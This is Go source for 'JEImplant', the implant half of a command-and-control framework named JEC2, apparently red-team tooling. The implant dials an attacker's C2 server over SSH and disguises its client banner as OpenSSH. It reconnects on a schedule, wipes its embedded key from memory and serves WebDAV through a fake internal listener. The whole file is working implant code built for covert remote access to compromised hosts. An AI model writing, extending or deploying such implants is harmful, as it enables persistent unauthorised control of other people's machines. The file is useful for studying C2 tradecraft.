// Program JEImplant is the implant side of JEC2.
package main

/*
 * jeimplant.go
 * Implant side of JEServer
 * By J. Stuart McMurray
 * Created 20220326
 * Last Modified 20220715
 */

import (
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	ServerAddr           string
	ServerFP             string
	PrivKey              string
	SSHVersion           = "SSH-2.0-OpenSSH_8.6"
	ReconnectionAttempts = "12"
	ReconnectionInterval = "5m"

	/* Signer is PrivKey, parsed. */
	Signer ssh.Signer

	// C2Conn is the connection to the C2 server.  C2ConnL should be
	// RLock'd while using it.
	C2Conn  ssh.Conn
	C2ConnL sync.RWMutex

	// WDListener is a FakeListener which hadles WebDAV connections.
	WDListener *FakeListener
)

func main() {
	var (
		nReconnTries = flag.Int(
			"reconnection-attempts",
			parseReconnTries(),
			"Reconnection attempt `count`",
		)
		reconnInterval = flag.Duration(
			"reconnection-interval",
			parseReconnInterval(),
			"Reconnection `interval`",
		)
	)
	flag.StringVar(
		&ServerAddr,
		"address",
		ServerAddr,
		"C2 `address`",
	)
	flag.StringVar(
		&ServerFP,
		"fingerprint",
		ServerFP,
		"C2 hostkey SHA256 `fingerprint`",
	)
	flag.StringVar(
		&SSHVersion,
		"version",
		SSHVersion,
		"SSH client version `banner`",
	)
	flag.BoolVar(
		&DoDebug,
		"debug",
		DoDebug,
		"Enable debug logging",
	)
	flag.Parse()

	/* Sanity-check some things. */
	if !strings.HasPrefix(ServerFP, "SHA256:") {
		Debugf("Server fingerprint should shart with SHA256:")
	}

	/* Parse our private key. */
	if err := ParsePrivateKey(); nil != err {
		Debugf("Unable to parse private key: %s", err)
	}
	PrivKey = "" /* It's a try, anyways. */

	/* Start a WebDAV server. */
	WDListener = NewFakeListener("webdav", "internal")
	go func() {
		Logf(
			"Error serving WebDAV: %s",
			(&http.Server{
				Handler:  WebDAVHandler(),
				ErrorLog: NewWebDAVLogger(),
			}).Serve(WDListener),
		)
	}()

	/* Connect and reconnect. */
	var (
		de    DialError
		tries int
	)
	for {
		tries++
		err := connect()
		switch {
		case errors.As(err, &de):
			Debugf("Error connecting to C2 server: %s", err)
		case errors.Is(err, io.EOF), nil == err:
			Debugf("Connection to C2 server closed")
			tries = 0
		default:
			Debugf("Fatal error connecting to server: %s", err)
			os.Exit(8)
		}

		/* If we've tried too much, give up. */
		if 0 < *nReconnTries && *nReconnTries <= tries {
			Debugf("Maximum reconnection tries reached")
			os.Exit(9)
		}

		/* Sleep a bit before the next try. */
		time.Sleep(*reconnInterval)
	}
}

/* connect connects to the server and starts normal processing. */
func connect() error {
	/* Connect to the C2 server. */
	cc, chans, reqs, err := ConnectToC2()
	if nil != err {
		return err
	}
	C2ConnL.Lock()
	C2Conn = cc
	C2ConnL.Unlock()

	go HandleC2Chans(cc, chans)
	go HandleC2Reqs(cc, reqs)

	/* Wait for the connection to die. */
	return cc.Wait()
}

// ParsePrivateKey parses PrivKey, which may be base64'd, and stores it in
// Signer.  This should be called only once, at initialization.
func ParsePrivateKey() error {
	var b []byte
	/* Decode the key, if needed. */
	switch {
	case strings.HasPrefix(PrivKey, "LS0tLS1CRUdJTiBP"): /* Base64 */
		var err error
		b, err = base64.StdEncoding.DecodeString(PrivKey)
		if nil != err {
			return fmt.Errorf("unbase64ing: %w", err)
		}
	case strings.HasPrefix(PrivKey, "-----BEGIN"): /* Unencoded */
		b = []byte(PrivKey)
	default: /* Unknown format. */
		start := PrivKey
		if 10 < len(start) {
			start = start[:10]
		}
		return fmt.Errorf(
			"unknown private key format starting with %q",
			start,
		)
	}

	/* SSHify it. */
	s, err := ssh.ParsePrivateKey(b)
	if nil != err {
		return fmt.Errorf("converting from PEM: %w", err)
	}

	/* Save the parsed key, with a possiblity of catching errors. */
	if nil != Signer {
		Debugf("Private key already parsed")
		os.Exit(5)
	}
	Signer = s

	return nil
}

/* parseReconnTries parses the number of reconnection attempts we'll make.  If
parsing fails, parseReconnTries panics. */
func parseReconnTries() int {
	n, err := strconv.ParseInt(ReconnectionAttempts, 0, 0)
	if nil != err {
		panic(fmt.Sprintf(
			"parsing ReconnectionAttempts (%q): %s",
			ReconnectionAttempts,
			err,
		))
	}
	return int(n)
}

/* parseReconnInteraval parses the interval at which we'll try to reconnect.
If parsing fails, parseReconnInterval panics. */
func parseReconnInterval() time.Duration {
	d, err := time.ParseDuration(ReconnectionInterval)
	if nil != err {
		panic(fmt.Sprintf(
			"parsing ReconnectionInterval (%q): %s",
			ReconnectionAttempts,
			err,
		))
	}
	return d
}
